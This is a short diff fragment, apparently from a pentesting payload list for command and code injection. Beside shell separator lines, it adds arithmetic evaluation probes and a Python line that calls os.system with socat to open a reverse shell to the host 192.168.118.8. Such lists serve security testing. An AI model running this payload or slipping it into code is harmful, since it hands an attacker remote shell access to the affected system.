@@ -7,6 +7,13 @@
 &&
 |
 ||
+
+#Evaluation
+1+1
+1*1
+
+#Python
+os.system('socat TCP:192.168.118.8:18000 EXEC:sh')
 ```
 
 #### Notes
